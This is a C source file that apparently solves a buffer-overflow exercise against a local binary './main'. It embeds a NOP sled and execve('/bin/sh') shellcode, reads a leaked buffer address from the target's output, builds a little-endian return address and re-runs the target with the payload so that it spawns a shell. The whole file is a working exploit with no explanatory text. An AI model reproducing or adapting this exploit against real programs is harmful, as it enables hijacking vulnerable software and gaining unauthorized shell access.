#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>

char dat[2048] = {
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,

		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,

		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,

		0xeb, 0x1f, 0x5e, 0x89, 0x76, 0x08, 0x31, 0xc0, 0x88, 0x46, 0x07, 0x89, 0x46, 0x0c, 0xb0, 0x0b,
		0x89, 0xf3, 0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0xcd, 0x80, 0x31, 0xdb, 0x89, 0xd8, 0x40, 0xcd,
		0x80, 0xe8, 0xdc, 0xff, 0xff, 0xff, '/' , 'b' , 'i' , 'n' , '/' , 's' , 'h' , 0x90, 0x90, 0x90,
		/*0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08,
		0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08,
		0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08,
		0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08, 0xc4, 0x84, 0x04, 0x08,*/
		/*0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff,
		0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff,
		0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff,
		0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff, 0x30, 0xd0, 0xff, 0xff,*/
		'\0'
};

char lendian[5];
char** argv[3] = {"./main", dat, NULL};

int main()
{
	int fd[2];
	if (pipe(fd) < 0)
		perror("pipe");

	pid_t pid = fork();
	if (pid < 0)
		perror("fork");
	else if (pid > 0)
		close(fd[1]);
	else {
		close(fd[0]);
		if(dup2(fd[1], STDOUT_FILENO) < 0)
				perror("dup2");
		execl("./main", NULL);
	}

	char addr[1024];
	while (read(fd[0], addr, 1024) <= 0);

	char b0, b1, b2, b3;
	addr[10] = '\0';
	int bufaddr = atoi(addr);
	unsigned int temp = (unsigned int) bufaddr - 0x10 - strlen(dat);

	b0 = temp & 0xff;
	b1 = (temp >> 8) & 0xff;
	b2 = (temp >> 16);
	b3 = (temp >> 24);

	char retaddr[1024];
	sprintf(lendian, "%c%c%c%c", b0, b1, b2, b3);
	sprintf(retaddr, "%s%s%s%s%s", lendian, lendian, lendian, lendian, lendian);

	strcat(dat, lendian);
	strcat(dat, lendian);
	strcat(dat, lendian);
	strcat(dat, lendian);
	execv("./main", argv);
}
